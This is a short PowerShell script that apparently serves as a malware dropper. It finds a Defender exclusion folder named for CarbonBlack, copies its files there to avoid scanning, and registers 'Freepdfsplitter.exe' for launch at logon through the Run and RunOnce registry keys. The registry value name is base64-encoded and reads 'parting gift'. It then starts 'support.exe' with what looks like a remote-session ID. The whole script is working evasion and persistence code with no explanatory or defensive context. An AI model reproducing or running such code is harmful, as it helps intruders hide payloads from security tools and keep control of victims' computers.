$current = [System.Environment]::CurrentDirectory
$current  = $current +'\*'
$folder = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
foreach ($i in $folder){ if($i -match 'CarbonBlack'){$exfolder=$i}}
Copy-Item -Path $current -Destination $exfolder
$filepath = $exfolder + '\Freepdfsplitter.exe'
$commandexe = "c:\\WINDOWS\system32\WindowsPowerShell\\v1.0\\powershell.exe -noexit -command "+ $filepath
Set-ItemProperty "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" -Name 'cGFydGluZyBnaWZ0' -Value $commandexe 

REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "cGFydGluZyBnaWZ0" /t REG_SZ /F /D $commandexe

cmd.exe /c "support.exe 1020456660"